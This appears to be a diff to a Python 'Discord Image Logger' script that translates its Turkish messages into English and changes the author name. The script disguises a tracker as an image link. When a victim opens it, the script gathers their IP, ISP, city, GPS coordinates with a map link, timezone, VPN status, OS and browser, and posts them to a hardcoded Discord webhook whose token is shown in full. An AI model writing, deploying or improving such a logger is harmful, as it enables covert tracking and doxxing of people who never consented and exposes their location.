@@ -5,9 +5,9 @@ from urllib import parse
 import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
-__description__ = "oylesine bi image logger"
+__description__ = "image logger"
 __version__ = "v2.0"
-__author__ = "foaqen"
+__author__ = "jeffersson"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1554234704297721948/Jh-LwKtR1F36jTVHStytu3iMTMKyva1p4HDaK0iVYCUsif3O2L3UIXwHGSd0bKXAEQj8",
@@ -61,9 +61,9 @@ def reportError(error):
     "content": "@everyone",
     "embeds": [
         {
-            "title": "Image Logger - Hata!",
+            "title": "Image Logger - even",
             "color": config["color"],
-            "description": f"IP adresi LOG'lanırken bir hata oluştu!\n\n**Hata:**\n```\n{error}\n```",
+            "description": f"An error occurred while logging the IP address!\n\n**even:**\n```\n{error}\n```",
         }
     ],
 })
@@ -80,9 +80,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Image Logger - Bağlantı Gönderildi",
+            "title": "Image Logger - Link Sended",
             "color": config["color"],
-            "description": f"IPLogger bağlantısı bir sohbete gönderildi!\nBirisi tıkladığında bilgilendirileceksiniz.\n\n**Bitiş Noktası:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"An IPLogger link has been sent to a chat! \nYou will be notified when someone clicks on it.\n\n**Final POoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
 }) if config["linkAlerts"] else None
@@ -125,28 +125,28 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - Birisi Tıkladı!",
+            "title": "Image Logger - Someone clicked!",
             "color": config["color"],
-            "description": f"""**Bir kullanıcı orijinal resmi fotoğrafı açtı**
+            "description": f"""**A user opened the original image.**
 
 **Bitiş Noktası:** `{endpoint}`
             
 **IP Adresi:**
 > **IP:** `{ip if ip else 'Unknown'}`
-> **Sağlayıcı:** `{info['isp'] if info['isp'] else 'Unknown'}`
+> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
 > **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Ülke:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Bölge:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **Şehir:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Koordinat:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Saat Dilimi:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
+> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
+> **Area:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
+> **City:** `{info['city'] if info['city'] else 'Unknown'}`
+> **Coordinate** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Time Zone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
 > **Mobil:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}`
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
 
-**Bilgisayar Bilgileri:**
-> **İşletim Sistemi:** `{os}`
-> **Tarayıcı:** `{browser}`
+**Computer Information:**
+> **Operating System:** `{os}`
+> **browser:** `{browser}`
 
 **Aracı:**
 ```
